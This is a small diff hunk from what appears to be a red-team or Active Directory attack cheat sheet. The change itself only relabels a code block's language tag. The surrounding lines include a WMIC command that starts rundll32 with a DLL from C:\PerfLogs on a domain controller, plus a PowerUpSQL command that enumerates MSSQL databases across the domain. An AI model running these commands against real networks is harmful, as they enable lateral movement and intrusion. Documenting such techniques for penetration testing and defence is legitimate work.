@@ -252,7 +252,7 @@ WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.
 PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.
 
 
-```java
+```py
 # Get MSSQL databases in the domain, and test connectivity
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft
 
